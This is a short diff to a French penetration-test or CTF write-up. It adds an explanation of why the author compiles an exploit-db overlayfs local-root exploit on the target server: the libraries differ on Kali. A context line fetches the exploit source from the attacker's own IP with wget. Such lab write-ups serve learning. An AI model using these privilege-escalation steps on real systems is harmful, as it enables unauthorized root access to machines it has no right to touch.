@@ -197,7 +197,11 @@ En faisant les tests basiques, je constate que la version de linux est vraiment 
 Linux version 3.13.0-32-generic
 ```
 En recherchant sur exploit-db.com je trouve un exploit "overlayfs local root in ubuntu"
-Je récupère donc les sources et je les télécharges ensuite sur le serveur
+Je récupère donc les sources et je les télécharges ensuite sur le serveur. Vous allez me demander pourquoi, et vous faites bien !
+
+Quand je compile sur ma kali, je ne peux pas executer le fichier sur le serveur car il va manquer des libs. Quand je le compile sur le serveur, tout fonctionne correctement.
+Les librairies ne sont pas au même endroit sur ma kali. 
+
 ```
 wget MON-IP/37292.c
 ```
